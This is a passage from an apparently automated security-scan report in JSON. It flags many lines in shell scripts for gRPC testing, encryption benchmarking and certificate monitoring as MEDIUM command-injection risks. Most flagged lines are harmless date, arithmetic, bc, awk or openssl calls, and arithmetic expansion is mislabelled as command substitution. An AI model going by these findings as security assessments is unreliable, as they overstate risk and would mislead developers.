        "evidence": "-H \"x-request-id:$(uuidgen 2>/dev/null || echo 'test-request-id')\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 339,
        "issue": "Command substitution in shell",
        "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 372,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 380,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 381,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 383,
        "issue": "Command substitution in shell",
        "evidence": "success_count=$((success_count + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 385,
        "issue": "Command substitution in shell",
        "evidence": "error_count=$((error_count + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 389,
        "issue": "Command substitution in shell",
        "evidence": "if [ $((i % 10)) -eq 0 ]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 406,
        "issue": "Command substitution in shell",
        "evidence": "total=$(echo \"$total + $latency\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 408,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$latency < $min\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 412,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$latency > $max\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 417,
        "issue": "Command substitution in shell",
        "evidence": "local avg=$(echo \"scale=6; $total / ${#latencies[@]}\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 418,
        "issue": "Command substitution in shell",
        "evidence": "local rps=$(echo \"scale=2; ${#latencies[@]} / $total\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 421,
        "issue": "Command substitution in shell",
        "evidence": "IFS=$'\\n' sorted_latencies=($(sort -n <<<\"${latencies[*]}\"))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 424,
        "issue": "Command substitution in shell",
        "evidence": "local p50_idx=$(( ${#sorted_latencies[@]} * 50 / 100 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 425,
        "issue": "Command substitution in shell",
        "evidence": "local p95_idx=$(( ${#sorted_latencies[@]} * 95 / 100 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 426,
        "issue": "Command substitution in shell",
        "evidence": "local p99_idx=$(( ${#sorted_latencies[@]} * 99 / 100 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 438,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  Success Rate:  $(echo \"scale=2; $success_count * 100 / $iterations\" | bc)%\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 480,
        "issue": "Command substitution in shell",
        "evidence": "results_json+=\"\\\"output\\\":\\\"$(echo \"$output\" | sed 's/\"/\\\\\"/g')\\\"\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 490,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 495,
        "issue": "Command substitution in shell",
        "evidence": "\"success_rate\": $(echo \"scale=2; $PASSED_TESTS * 100 / $TOTAL_TESTS\" | bc 2>/dev/null || echo 0)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 513,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Timestamp:   $(date)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
        "line_number": 519,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  Success Rate:  $(echo \"scale=2; $PASSED_TESTS * 100 / $TOTAL_TESTS\" | bc)%\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 37,
        "issue": "Command substitution in shell",
        "evidence": "TEMP_DIR=$(mktemp -d)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 171,
        "issue": "Command substitution in shell",
        "evidence": "elif [[ \"$(uname)\" == \"Darwin\" ]]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 203,
        "issue": "Command substitution in shell",
        "evidence": "K|KB) echo $((number * 1024)) ;;",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 204,
        "issue": "Command substitution in shell",
        "evidence": "M|MB) echo $((number * 1024 * 1024)) ;;",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 205,
        "issue": "Command substitution in shell",
        "evidence": "G|GB) echo $((number * 1024 * 1024 * 1024)) ;;",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 218,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1073741824}\")GB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 220,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1048576}\")MB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 222,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1024}\")KB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 245,
        "issue": "Command substitution in shell",
        "evidence": "dd if=/dev/urandom of=\"$input_file\" bs=1024 count=$((size_bytes / 1024)) 2>/dev/null",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 254,
        "issue": "Command substitution in shell",
        "evidence": "print_color \"$YELLOW\" \"Benchmarking $algo ($(bytes_to_human $size_bytes))...\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 261,
        "issue": "Command substitution in shell",
        "evidence": "-K \"$(xxd -p -c 256 \"$key_file\")\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 262,
        "issue": "Command substitution in shell",
        "evidence": "-iv \"$(xxd -p -c 256 \"$iv_file\")\" 2>/dev/null; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 264,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 265,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(((end_time - start_time) / 1000000)) # Convert to milliseconds",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "total_time=$((total_time + duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 268,
        "issue": "Command substitution in shell",
        "evidence": "successful_runs=$((successful_runs + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "local avg_time_ms=$((total_time / successful_runs))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 287,
        "issue": "Command substitution in shell",
        "evidence": "local avg_time_sec=$(awk \"BEGIN {printf \\\"%.3f\\\", $avg_time_ms/1000}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 288,
        "issue": "Command substitution in shell",
        "evidence": "local throughput_mbps=$(awk \"BEGIN {printf \\\"%.2f\\\", ($size_bytes / 1048576) / $avg_time_sec}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 289,
        "issue": "Command substitution in shell",
        "evidence": "local ops_per_sec=$(awk \"BEGIN {printf \\\"%.2f\\\", 1 / $avg_time_sec}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 296,
        "issue": "Command substitution in shell",
        "evidence": "\"file_size_human\": \"$(bytes_to_human $size_bytes)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 327,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 333,
        "issue": "Command substitution in shell",
        "evidence": "-kdfopt salt:\"$(xxd -p -c 256 \"$salt_file\")\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 340,
        "issue": "Command substitution in shell",
        "evidence": "echo -n \"$password\" | argon2 \"$(cat \"$salt_file\")\" -t $iterations \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 351,
        "issue": "Command substitution in shell",
        "evidence": "-kdfopt salt:\"$(xxd -p -c 256 \"$salt_file\")\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 361,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 362,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(((end_time - start_time) / 1000000))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 363,
        "issue": "Command substitution in shell",
        "evidence": "total_time=$((total_time + duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 370,
        "issue": "Command substitution in shell",
        "evidence": "local avg_time_ms=$((total_time / runs))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 371,
        "issue": "Command substitution in shell",
        "evidence": "local ops_per_sec=$(awk \"BEGIN {printf \\\"%.2f\\\", 1000 / $avg_time_ms}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 490,
        "issue": "Command substitution in shell",
        "evidence": "local size_bytes=$(size_to_bytes \"$FILE_SIZE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 497,
        "issue": "Command substitution in shell",
        "evidence": "echo \"File size: $(bytes_to_human $size_bytes)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 506,
        "issue": "Command substitution in shell",
        "evidence": "if result=$(benchmark_kdf \"$kdf\" \"$kdf_iterations\"); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 507,
        "issue": "Command substitution in shell",
        "evidence": "kdf_results=$(echo \"$kdf_results\" | jq \". += [$result]\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 536,
        "issue": "Command substitution in shell",
        "evidence": "if result=$(benchmark_algorithm \"$algo\" \"$size_bytes\"); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 537,
        "issue": "Command substitution in shell",
        "evidence": "results=$(echo \"$results\" | jq \". += [$result]\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 540,
        "issue": "Command substitution in shell",
        "evidence": "print_color \"$GREEN\" \"\u2713 $algo: $(echo \"$result\" | jq -r .throughput_mbps) MB/s\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 549,
        "issue": "Command substitution in shell",
        "evidence": "--arg timestamp \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/resources/hsm-integration/examples/07-disaster-recovery.sh",
        "line_number": 15,
        "issue": "Command substitution in shell",
        "evidence": "DATE_STAMP=$(date +%Y%m%d-%H%M%S)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "domain=$(basename \"$cert_dir\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 348,
        "issue": "Command substitution in shell",
        "evidence": "expiry_date=$(openssl x509 -in \"$cert_file\" -noout -enddate | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 349,
        "issue": "Command substitution in shell",
        "evidence": "expiry_epoch=$(date -d \"$expiry_date\" +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 350,
        "issue": "Command substitution in shell",
        "evidence": "now_epoch=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
        "line_number": 351,
        "issue": "Command substitution in shell",
        "evidence": "days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 235,
        "issue": "Command substitution in shell",
        "evidence": "result=$(printf '{\"host\":\"%s\",\"port\":%d,\"status\":\"error\",\"error\":\"Connection failed\"}' \"$host\" \"$port\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 242,
        "issue": "Command substitution in shell",
        "evidence": "not_before=$(echo \"$cert_info\" | grep \"notBefore=\" | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 243,
        "issue": "Command substitution in shell",
        "evidence": "not_after=$(echo \"$cert_info\" | grep \"notAfter=\" | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 244,
        "issue": "Command substitution in shell",
        "evidence": "subject=$(echo \"$cert_info\" | grep \"subject=\" | cut -d= -f2-)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 245,
        "issue": "Command substitution in shell",
        "evidence": "issuer=$(echo \"$cert_info\" | grep \"issuer=\" | cut -d= -f2-)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 249,
        "issue": "Command substitution in shell",
        "evidence": "expiry_epoch=$(date -d \"$not_after\" +%s 2>/dev/null || date -j -f \"%b %d %T %Y %Z\" \"$not_after\" +%s 2>/dev/null)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 250,
        "issue": "Command substitution in shell",
        "evidence": "now_epoch=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 251,
        "issue": "Command substitution in shell",
        "evidence": "days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 321,
        "issue": "Command substitution in shell",
        "evidence": "result=$(printf '{\"file\":\"%s\",\"status\":\"error\",\"error\":\"File not found\"}' \"$cert_file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 328,
        "issue": "Command substitution in shell",
        "evidence": "if ! cert_info=$(openssl x509 -in \"$cert_file\" -noout -dates -subject -issuer 2>/dev/null); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 329,
        "issue": "Command substitution in shell",
        "evidence": "result=$(printf '{\"file\":\"%s\",\"status\":\"error\",\"error\":\"Invalid certificate\"}' \"$cert_file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 336,
        "issue": "Command substitution in shell",
        "evidence": "not_before=$(echo \"$cert_info\" | grep \"notBefore=\" | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 337,
        "issue": "Command substitution in shell",
        "evidence": "not_after=$(echo \"$cert_info\" | grep \"notAfter=\" | cut -d= -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 338,
        "issue": "Command substitution in shell",
        "evidence": "subject=$(echo \"$cert_info\" | grep \"subject=\" | cut -d= -f2-)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 339,
        "issue": "Command substitution in shell",
        "evidence": "issuer=$(echo \"$cert_info\" | grep \"issuer=\" | cut -d= -f2-)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 343,
        "issue": "Command substitution in shell",
        "evidence": "expiry_epoch=$(date -d \"$not_after\" +%s 2>/dev/null || date -j -f \"%b %d %T %Y %Z\" \"$not_after\" +%s 2>/dev/null)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "now_epoch=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 345,
        "issue": "Command substitution in shell",
        "evidence": "days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 425,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 429,
        "issue": "Command substitution in shell",
        "evidence": "[[ $i -lt $((${#ALERTS[@]} - 1)) ]] && echo \",\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 479,
        "issue": "Command substitution in shell",
        "evidence": "[[ $i -lt $((${#RESULTS[@]} - 1)) ]] && echo \",\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
        "line_number": 491,
        "issue": "Command substitution in shell",
